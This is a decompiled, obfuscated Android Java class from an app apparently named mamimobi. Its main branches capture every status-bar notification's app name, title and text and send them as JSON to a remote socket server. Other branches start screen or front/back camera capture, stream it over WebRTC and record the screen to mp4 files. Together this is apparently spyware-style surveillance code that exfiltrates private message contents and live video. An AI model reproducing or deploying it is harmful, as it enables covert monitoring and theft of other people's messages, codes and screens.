package defpackage;

import android.content.Context;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Rect;
import android.graphics.Typeface;
import android.graphics.drawable.Drawable;
import android.os.Bundle;
import android.os.Handler;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import androidx.work.Configuration;
import androidx.work.impl.WorkDatabaseVersions;
import androidx.work.impl.WorkerWrapper;
import androidx.work.impl.constraints.trackers.ConstraintTracker;
import androidx.work.impl.utils.WorkForegroundRunnable;
import androidx.work.impl.utils.futures.SettableFuture;
import androidx.work.impl.workers.ConstraintTrackingWorker;
import com.google.android.material.R$string;
import com.google.android.material.datepicker.g;
import com.google.android.material.textfield.TextInputLayout;
import com.mamimobi.service.CNService;
import com.mamimobi.videostream.VideoSourceType;
import com.mamimobi.videostream.VideoStreamService;
import com.mamimobi.videostream.model.Event;
import com.mamimobi.videostream.model.MessageType;
import com.mamimobi.videostream.model.SignalingMessage;
import io.nats.client.support.ApiConstants;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.Date;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicInteger;
import org.json.JSONObject;
import org.webrtc.CameraEnumerator;
import org.webrtc.CameraVideoCapturer;
import org.webrtc.EglBase;
import org.webrtc.EglRenderer;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.ScreenCapturerAndroid;
import org.webrtc.SurfaceTextureHelper;
import org.webrtc.VideoFileRenderer;
import org.webrtc.VideoFrame;
import org.webrtc.VideoSource;

/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class p7 implements Runnable {
    public final /* synthetic */ int E;
    public final /* synthetic */ Object F;
    public final /* synthetic */ Object G;

    public /* synthetic */ p7(Object obj, int i, Object obj2) {
        this.E = i;
        this.F = obj;
        this.G = obj2;
    }

    @Override // java.lang.Runnable
    public final void run() {
        CNService cNService;
        String str;
        switch (this.E) {
            case 0:
                Runnable runnable = (Runnable) this.G;
                ((q7) this.F).getClass();
                try {
                    runnable.run();
                    return;
                } finally {
                }
            case 1:
                a8 a8Var = (a8) this.F;
                String str2 = (String) this.G;
                w7 w7Var = a8Var.a;
                if (w7Var == null) {
                    return;
                }
                long jCurrentTimeMillis = System.currentTimeMillis();
                if (!w7Var.d || jCurrentTimeMillis - a8Var.h >= 1000) {
                    a8Var.h = jCurrentTimeMillis;
                    if (w7Var.d && str2.equals(a8Var.c)) {
                        return;
                    }
                    if (w7Var.d) {
                        String str3 = a8Var.d;
                        String str4 = a8Var.c;
                        try {
                            w7Var.b();
                            break;
                        } catch (Exception unused) {
                        }
                        a8Var.c = null;
                        a8Var.d = null;
                        if (str3 != null) {
                            a8Var.b(str3, str4);
                        }
                    }
                    File externalFilesDir = a8Var.b.getExternalFilesDir(null);
                    if (externalFilesDir == null) {
                        return;
                    }
                    String strReplaceAll = str2.replaceAll("[^a-zA-Z0-9._-]", "_");
                    if (strReplaceAll.length() > 50) {
                        strReplaceAll = strReplaceAll.substring(0, 50);
                    }
                    File file = new File(externalFilesDir, strReplaceAll + "_" + jCurrentTimeMillis + ".mp4");
                    String absolutePath = file.getAbsolutePath();
                    synchronized (w7Var) {
                        if (!w7Var.d) {
                            try {
                                w7Var.f.d(w7Var.e.a.getWidth(), w7Var.e.a.getHeight(), absolutePath);
                                w7Var.d = true;
                                if (!w7Var.c) {
                                    w7Var.c = true;
                                    w7Var.b.post(w7Var.g);
                                    break;
                                }
                            } catch (Exception unused2) {
                                a8Var.c = null;
                                a8Var.d = null;
                                return;
                            }
                        }
                    }
                    a8Var.c = str2;
                    a8Var.d = file.getAbsolutePath();
                    return;
                }
                return;
            case 2:
                StatusBarNotification statusBarNotification = (StatusBarNotification) this.G;
                CNService cNService2 = CNService.F;
                CNService cNService3 = (CNService) this.F;
                JSONObject jSONObject = new JSONObject();
                PackageManager packageManager = cNService3.getPackageManager();
                try {
                    Drawable drawableLoadIcon = packageManager.getPackageInfo(statusBarNotification.getPackageName(), 0).applicationInfo.loadIcon(packageManager);
                    cNService = cNService3;
                    try {
                        Bitmap bitmapCreateBitmap = Bitmap.createBitmap(24, 24, Bitmap.Config.ARGB_8888);
                        Canvas canvas = new Canvas(bitmapCreateBitmap);
                        str = "android.bigText";
                        try {
                            drawableLoadIcon.setBounds(0, 0, 24, 24);
                            drawableLoadIcon.draw(canvas);
                            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                            bitmapCreateBitmap.compress(Bitmap.CompressFormat.PNG, 80, byteArrayOutputStream);
                            jSONObject.put("icon", Base64.encodeToString(byteArrayOutputStream.toByteArray(), 0));
                            break;
                        } catch (Exception unused3) {
                        }
                    } catch (Exception unused4) {
                        str = "android.bigText";
                    }
                } catch (Exception unused5) {
                    cNService = cNService3;
                }
                try {
                    jSONObject.put("appName", packageManager.getApplicationLabel(packageManager.getApplicationInfo(statusBarNotification.getPackageName(), 0)));
                    break;
                } catch (Exception unused6) {
                }
                try {
                    jSONObject.put("tag", statusBarNotification.getTag());
                    jSONObject.put("groupKey", statusBarNotification.getGroupKey());
                    jSONObject.put("postTime", statusBarNotification.getPostTime());
                    Bundle bundle = statusBarNotification.getNotification().extras;
                    if (bundle != null) {
                        if (bundle.containsKey("android.intent.extra.NOTIFICATION_TAG")) {
                            jSONObject.put("notification_tag", bundle.getString("android.intent.extra.NOTIFICATION_TAG"));
                        }
                        if (bundle.containsKey("android.intent.extra.CHANNEL_ID")) {
                            jSONObject.put("channel_id", bundle.getString("android.intent.extra.CHANNEL_ID"));
                        }
                        if (bundle.containsKey("android.intent.extra.CHANNEL_GROUP_ID")) {
                            jSONObject.put("channel_group_id", bundle.getString("android.intent.extra.CHANNEL_GROUP_ID"));
                        }
                        if (bundle.containsKey("android.title")) {
                            jSONObject.put("title", bundle.getString("android.title"));
                        }
                        if (bundle.containsKey("android.title.big")) {
                            jSONObject.put("bigTitle", bundle.getString("android.title.big"));
                        }
                        if (bundle.containsKey("android.text")) {
                            jSONObject.put("text", bundle.getString("android.text"));
                        }
                        if (bundle.containsKey("android.subText")) {
                            jSONObject.put("subtext", bundle.getString("android.subText"));
                        }
                        if (bundle.containsKey("android.infoText")) {
                            jSONObject.put("infotext", bundle.getString("android.infoText"));
                        }
                        if (bundle.containsKey("android.summaryText")) {
                            jSONObject.put("summaryText", bundle.getString("android.summaryText"));
                        }
                        String str5 = str;
                        if (bundle.containsKey(str5)) {
                            jSONObject.put("bigText", bundle.getString(str5));
                        }
                    }
                    JSONObject jSONObject2 = new JSONObject();
                    jSONObject2.put(ApiConstants.ID, t40.V(cNService));
                    jSONObject2.put(ApiConstants.ACTION, "notification");
                    jSONObject2.put(ApiConstants.DATA, jSONObject);
                    o71 o71VarF = o71.f(cNService);
                    if (o71VarF.e() != null) {
                        jSONObject2.put("clientid", o71VarF.e());
                    }
                    lm0 lm0Var = o71VarF.e;
                    if (lm0Var != null) {
                        lm0Var.c(jSONObject2.toString().getBytes());
                        return;
                    }
                    return;
                } catch (Exception unused7) {
                    return;
                }
            case 3:
                ConstraintTracker._set_state_$lambda$4$lambda$3((List) this.F, (ConstraintTracker) this.G);
                return;
            case 4:
                ConstraintTrackingWorker.setupAndRunConstraintTrackingWork$lambda$2((ConstraintTrackingWorker) this.F, (ca0) this.G);
                return;
            case 5:
                g gVar = (g) this.F;
                TextInputLayout textInputLayout = gVar.E;
                Context context = textInputLayout.getContext();
                textInputLayout.setError(context.getString(R$string.mtrl_picker_invalid_format) + "\n" + String.format(context.getString(R$string.mtrl_picker_invalid_format_use), ((String) this.G).replace(' ', (char) 160)) + "\n" + String.format(context.getString(R$string.mtrl_picker_invalid_format_example), gVar.G.format(new Date(h31.f().getTimeInMillis())).replace(' ', (char) 160)));
                gVar.a();
                return;
            case 6:
                ((EglRenderer) this.F).lambda$releaseEglSurface$3((Runnable) this.G);
                return;
            case 7:
                ((EglRenderer) this.F).lambda$release$0((CountDownLatch) this.G);
                return;
            case 8:
                ((pv) this.F).g((String) this.G);
                return;
            case WorkDatabaseVersions.VERSION_9 /* 9 */:
                ((AtomicInteger) this.F).set(pk0.d((Rect) this.G));
                return;
            case 10:
                km0 km0Var = ((lm0) this.F).a;
                byte[] bArrA = (byte[]) this.G;
                if (bArrA.length > 8192) {
                    bArrA = f11.a(bArrA);
                }
                km0Var.send(bArrA);
                return;
            case WorkDatabaseVersions.VERSION_11 /* 11 */:
                Runnable runnable2 = (Runnable) this.G;
                lm0 lm0Var2 = (lm0) this.F;
                lm0Var2.getClass();
                try {
                    km0 km0Var2 = lm0Var2.a;
                    if (km0Var2 == null || !km0Var2.isOpen()) {
                        lm0Var2.g();
                    } else {
                        runnable2.run();
                    }
                    return;
                } catch (Exception unused8) {
                    lm0Var2.g();
                    return;
                }
            case WorkDatabaseVersions.VERSION_12 /* 12 */:
                ((lm0) this.F).a.send((String) this.G);
                return;
            case WorkDatabaseVersions.VERSION_13 /* 13 */:
                String str6 = (String) this.G;
                lm0 lm0Var3 = ((km0) this.F).E;
                try {
                    SignalingMessage signalingMessage = (SignalingMessage) lm0Var3.b.b(SignalingMessage.class, str6);
                    lm0.a(lm0Var3, MessageType.getMessageType(signalingMessage.id), new Event(signalingMessage, str6));
                    return;
                } catch (Exception unused9) {
                    return;
                }
            case WorkDatabaseVersions.VERSION_14 /* 14 */:
                ((o80) this.F).X((Typeface) this.G);
                return;
            case WorkDatabaseVersions.VERSION_15 /* 15 */:
                Runnable runnable3 = (Runnable) this.G;
                t40.n(runnable3, "$command");
                t40.n((q7) this.F, "this$0");
                try {
                    runnable3.run();
                    return;
                } finally {
                }
            case 16:
                ((VideoFileRenderer) this.F).lambda$onFrame$0((VideoFrame) this.G);
                return;
            case 17:
                ((VideoFileRenderer) this.F).lambda$release$2((CountDownLatch) this.G);
                return;
            case 18:
                ((VideoSource) this.F).lambda$setVideoProcessor$0((VideoFrame) this.G);
                return;
            case 19:
                VideoStreamService videoStreamService = (VideoStreamService) this.F;
                String str7 = (String) this.G;
                o71 o71Var = videoStreamService.E;
                VideoSourceType videoSourceTypeValueOf = VideoSourceType.valueOf(str7);
                o71Var.getClass();
                VideoSourceType videoSourceType = VideoSourceType.SCREENHELPER;
                if ((videoSourceTypeValueOf.equals(videoSourceType) || videoSourceTypeValueOf.equals(VideoSourceType.CAMERA_FRONT) || videoSourceTypeValueOf.equals(VideoSourceType.CAMERA_BACK)) && !f11.b(o71Var.a, "android.permission.CAMERA")) {
                    return;
                }
                e6 e6Var = o71Var.f;
                e6Var.getClass();
                final int i = (int) ((Resources.getSystem().getDisplayMetrics().heightPixels / Resources.getSystem().getDisplayMetrics().widthPixels) * 720);
                int i2 = j41.a[videoSourceTypeValueOf.ordinal()];
                if (i2 == 1) {
                    or0 or0Var = (or0) e6Var.d;
                    Context context2 = (Context) e6Var.b;
                    EglBase eglBase = (EglBase) e6Var.c;
                    Objects.requireNonNull((o71) e6Var.a);
                    synchronized (or0Var) {
                        if (or0Var.b()) {
                            or0Var.c.setEnabled(true);
                            ((o71) e6Var.a).h(or0Var.c, VideoSourceType.SCREEN);
                            return;
                        }
                        try {
                            PeerConnectionFactory peerConnectionFactory = o71.f(context2).b;
                            o71 o71VarF2 = o71.f(context2);
                            or0Var.a = new ScreenCapturerAndroid(o71VarF2.g, new nr0(or0Var, o71VarF2));
                            or0Var.d = SurfaceTextureHelper.create("CaptureThread", eglBase.getEglBaseContext());
                            VideoSource videoSourceCreateVideoSource = peerConnectionFactory.createVideoSource(or0Var.a.isScreencast());
                            or0Var.b = videoSourceCreateVideoSource;
                            or0Var.a.initialize(or0Var.d, context2, videoSourceCreateVideoSource.getCapturerObserver());
                            or0Var.a.startCapture(720, i, 12);
                            if (!or0Var.b()) {
                                or0Var.c = peerConnectionFactory.createVideoTrack("SCREEN_CAST", or0Var.b);
                            }
                            or0Var.c.setEnabled(true);
                            ((o71) e6Var.a).h(or0Var.c, VideoSourceType.SCREEN);
                            break;
                        } catch (Exception e) {
                            e.printStackTrace();
                            or0Var.a();
                        }
                        return;
                    }
                }
                if (i2 != 2) {
                    if (i2 == 3 || i2 == 4) {
                        final boolean z = videoSourceTypeValueOf == VideoSourceType.CAMERA_FRONT;
                        final fb fbVar = new fb(9, e6Var);
                        final zb zbVar = (zb) e6Var.f;
                        Handler handler = zbVar.g;
                        final Context context3 = (Context) e6Var.b;
                        final EglBase eglBase2 = (EglBase) e6Var.c;
                        handler.post(new Runnable() { // from class: yb
                            @Override // java.lang.Runnable
                            public final void run() {
                                CameraVideoCapturer cameraVideoCapturerCreateCapturer;
                                Context context4 = context3;
                                EglBase eglBase3 = eglBase2;
                                int i3 = i;
                                zb zbVar2 = zbVar;
                                zbVar2.getClass();
                                try {
                                    PeerConnectionFactory peerConnectionFactory2 = o71.f(context4).b;
                                    if (zbVar2.b == null) {
                                        zbVar2.b = SurfaceTextureHelper.create("CameraCapture", eglBase3.getEglBaseContext());
                                    }
                                    CameraVideoCapturer cameraVideoCapturer = zbVar2.c;
                                    if (cameraVideoCapturer != null) {
                                        try {
                                            cameraVideoCapturer.dispose();
                                        } catch (Exception unused10) {
                                        }
                                    }
                                    CameraEnumerator cameraEnumerator = zbVar2.a;
                                    String[] deviceNames = cameraEnumerator.getDeviceNames();
                                    int length = deviceNames.length;
                                    int i4 = 0;
                                    while (true) {
                                        cameraVideoCapturerCreateCapturer = null;
                                        if (i4 >= length) {
                                            break;
                                        }
                                        String str8 = deviceNames[i4];
                                        if (z == cameraEnumerator.isFrontFacing(str8) && (cameraVideoCapturerCreateCapturer = cameraEnumerator.createCapturer(str8, null)) != null) {
                                            break;
                                        } else {
                                            i4++;
                                        }
                                    }
                                    zbVar2.c = cameraVideoCapturerCreateCapturer;
                                    if (cameraVideoCapturerCreateCapturer == null) {
                                        throw new RuntimeException("无法创建摄像头");
                                    }
                                    if (zbVar2.d == null) {
                                        zbVar2.d = peerConnectionFactory2.createVideoSource(false);
                                    }
                                    zbVar2.c.initialize(zbVar2.b, context4, zbVar2.d.getCapturerObserver());
                                    zbVar2.c.startCapture(720, i3, 12);
                                    if (!zbVar2.b()) {
                                        zbVar2.e = peerConnectionFactory2.createVideoTrack("SCREEN_CAST", zbVar2.d);
                                    }
                                    zbVar2.e.setEnabled(true);
                                    ((o71) ((e6) fbVar.F).a).h(zbVar2.e, VideoSourceType.CAMERA);
                                } catch (Exception e2) {
                                    e2.printStackTrace();
                                }
                            }
                        });
                        return;
                    }
                    return;
                }
                EglBase eglBase3 = (EglBase) e6Var.c;
                o71 o71Var2 = (o71) e6Var.a;
                Objects.requireNonNull(o71Var2);
                pr0 pr0Var = (pr0) e6Var.e;
                if (pr0Var.a()) {
                    pr0Var.d.setEnabled(true);
                    o71Var2.h(pr0Var.d, videoSourceType);
                    return;
                }
                Context context4 = (Context) e6Var.b;
                o71 o71VarF3 = o71.f(context4);
                try {
                    qr0 qr0Var = pr0Var.a;
                    if (qr0Var != null) {
                        try {
                            qr0Var.stopCapture();
                            break;
                        } catch (Exception unused10) {
                        }
                    }
                    qr0 qr0Var2 = new qr0(context4);
                    pr0Var.a = qr0Var2;
                    pr0Var.b = qr0Var2;
                    PeerConnectionFactory peerConnectionFactory2 = o71VarF3.b;
                    SurfaceTextureHelper.create("CaptureThread", eglBase3.getEglBaseContext());
                    pr0Var.b.getClass();
                    VideoSource videoSourceCreateVideoSource2 = peerConnectionFactory2.createVideoSource(true);
                    pr0Var.c = videoSourceCreateVideoSource2;
                    pr0Var.b.E = videoSourceCreateVideoSource2.getCapturerObserver();
                    pr0Var.b.startCapture(720, i, 12);
                    if (!pr0Var.a()) {
                        pr0Var.d = peerConnectionFactory2.createVideoTrack("SCREEN_READ", pr0Var.c);
                    }
                    pr0Var.d.setEnabled(true);
                    o71Var2.h(pr0Var.d, VideoSourceType.SCREENHELPER);
                    return;
                } catch (Exception e2) {
                    e2.printStackTrace();
                    return;
                }
            case Configuration.MIN_SCHEDULER_LIMIT /* 20 */:
                ((WorkForegroundRunnable) this.F).lambda$run$0((SettableFuture) this.G);
                return;
            default:
                ((WorkerWrapper) this.F).lambda$runWorker$0((ca0) this.G);
                return;
        }
    }

    public /* synthetic */ p7(Runnable runnable, q7 q7Var) {
        this.E = 15;
        this.G = runnable;
        this.F = q7Var;
    }
}
